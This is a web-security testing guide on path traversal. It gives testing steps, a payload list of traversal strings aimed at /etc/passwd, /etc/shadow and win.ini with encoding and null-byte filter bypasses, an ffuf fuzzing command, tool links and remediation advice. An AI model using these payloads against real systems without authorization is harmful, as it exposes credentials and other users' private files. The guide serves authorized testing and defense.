# Path Traversal to Restricted Resources

## Overview
Path traversal (also known as directory traversal) in an authorization context occurs when access-controlled file or resource paths can be manipulated to reference protected content outside the intended directory. While the server may enforce access on `/uploads/public/`, an attacker manipulates the path to reach `/uploads/private/` or `/etc/passwd`.

## How It Works
- The application constructs a file path by appending user-supplied input to a base directory.
- Without proper canonicalization and prefix validation, `../` sequences escape the intended root.
- URL encoding (`%2F`, `%2e%2e`), double encoding (`%252e`), and OS-specific separators (`\`) can bypass naive filters.
- The traversal may reach: config files, other users' uploads, private documents, or OS files.

## Impact
- Read arbitrary files on the server filesystem (`/etc/passwd`, `web.config`, `.env`).
- Access other users' private uploaded files (medical records, contracts, IDs).
- Read application source code or configuration with credentials.
- In write contexts: overwrite critical files or drop webshells.

## Where to Look
- File download endpoints: `/download?file=report.pdf`, `/view?path=doc.txt`.
- Image/media serving: `/images/{filename}`, `/api/files/{id}`.
- Template rendering: `?template=homepage`, `?page=about`.
- Include/import parameters: `?lang=en`, `?module=user`.
- ZIP/archive extraction endpoints (see also: Zip Slip).
- Log viewing, export, or backup features.

## Testing Steps
1. Identify parameters that reference files, paths, or resource names.
2. Insert `../` sequences to attempt directory traversal:
   - `?file=../../../etc/passwd`
   - `?file=....//....//etc/passwd` (filter bypass)
3. Try URL-encoded variants: `%2e%2e%2f`, `%2e%2e/`, `..%2f`, `%2e%2e%5c`.
4. Try double-encoded: `%252e%252e%252f`.
5. On Windows targets: use `\`, `..\\`, `%5c`.
6. If a suffix is appended (e.g., `.php`), try null byte or extension techniques.
7. Test absolute paths: `?file=/etc/passwd`, `?file=C:\Windows\win.ini`.
8. Verify the vulnerability is present in authorization context: can you reach files outside your user's folder?

## Payloads / Techniques
```
# Basic traversal
?file=../../../etc/passwd
?file=../../../../../../etc/shadow
?path=../../../windows/win.ini

# Encoded variants
?file=..%2F..%2F..%2Fetc%2Fpasswd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=....//....//....//etc/passwd
?file=..%252f..%252f..%252fetc%252fpasswd   (double URL-encoded)

# Windows
?file=..\..\..\..\windows\win.ini
?file=..%5c..%5cwindows%5cwin.ini

# Null byte (old PHP)
?file=../../../etc/passwd%00.jpg

# Absolute path
?file=/etc/passwd
?file=C:/windows/win.ini
```

```bash
# Using ffuf to fuzz path traversal
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "https://target.com/download?file=FUZZ" \
  -fr "Error|Not Found" -mc 200
```

## Burp Suite Tips
- Use **Burp Intruder** with `LFI-Jhaddix.txt` from SecLists as the payload list.
- Enable **URL-decode** in the payload processing tab to try encoded variants automatically.
- In **Scanner** (Pro), path traversal is auto-tested — review findings.
- Check the **"Render"** tab in Repeater to see if file contents are displayed in the page.

## Tools
- Burp Suite Intruder / Scanner
- ffuf with SecLists LFI wordlists
- dotdotpwn — https://github.com/wireghoul/dotdotpwn (path traversal fuzzer)
- LFISuite — https://github.com/D35m0nd142/LFISuite

## Remediation
- Canonicalize the resolved path and validate it starts with the expected base directory:
  `realpath(base + input).startsWith(base)`.
- Use a whitelist of allowed files/directories rather than blacklisting `../`.
- Never construct file paths from unvalidated user input.
- Run the web server process with minimal filesystem permissions.
- Map resource identifiers (IDs) to server-side paths in a database — never expose raw paths.

## References
https://owasp.org/www-community/attacks/Path_Traversal
https://portswigger.net/web-security/file-path-traversal
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
